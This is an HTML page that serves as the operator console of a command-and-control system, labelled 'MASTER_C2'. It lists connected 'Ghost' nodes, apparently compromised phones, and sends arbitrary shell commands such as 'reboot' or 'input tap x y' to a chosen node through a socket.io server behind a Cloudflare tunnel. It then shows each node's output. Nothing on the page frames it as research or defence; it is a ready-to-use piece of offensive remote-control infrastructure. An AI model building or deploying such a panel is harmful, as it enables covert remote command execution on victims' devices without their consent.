<!DOCTYPE html>
<html>
<head>
    <title>ARODEN_OS | MASTER_C2</title>
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <style>
        body { background: #010204; color: #00ff9d; font-family: 'Courier New', monospace; margin: 20px; }
        #terminal { height: 400px; border: 1px solid #00ff9d; background: #000; overflow-y: auto; padding: 10px; color: #fff; margin-top: 10px; }
        .node-list { display: flex; gap: 10px; margin-bottom: 20px; }
        .node { border: 1px solid #555; padding: 10px; cursor: pointer; }
        .node.active { border-color: #ff00ff; box-shadow: 0 0 10px #ff00ff; }
        input { width: 100%; background: transparent; border: 1px solid #00ff9d; color: #00e5ff; padding: 10px; outline: none; }
    </style>
</head>
<body>
    <h2>[ CENTRAL_COMMAND_V27 ]</h2>
    <div id="nodes" class="node-list">Scanning for active Ghosts...</div>
    
    <div id="terminal">>> Awaiting Node Selection...</div>
    <input type="text" id="cmd" placeholder="Execute command (e.g. ls, reboot, input tap x y)">

    <script>
        const SERVER_URL = "https://your-tunnel-name.trycloudflare.com";
        const socket = io(SERVER_URL);
        let activeId = "";

        socket.on('update_dashboard', (list) => {
            const nodes = document.getElementById('nodes');
            nodes.innerHTML = list.map(n => `<div class="node ${activeId===n.id?'active':''}" onclick="activeId='${n.id}'">${n.info}</div>`).join('');
        });

        document.getElementById('cmd').onkeypress = (e) => {
            if(e.key === 'Enter' && activeId) {
                socket.emit('admin_cmd', { targetId: activeId, cmd: e.target.value });
                e.target.value = "";
            }
        };

        socket.on('term_log', (log) => {
            const term = document.getElementById('terminal');
            term.innerHTML += `<br>${log}`;
            term.scrollTop = term.scrollHeight;
        });
    </script>
</body>
</html>
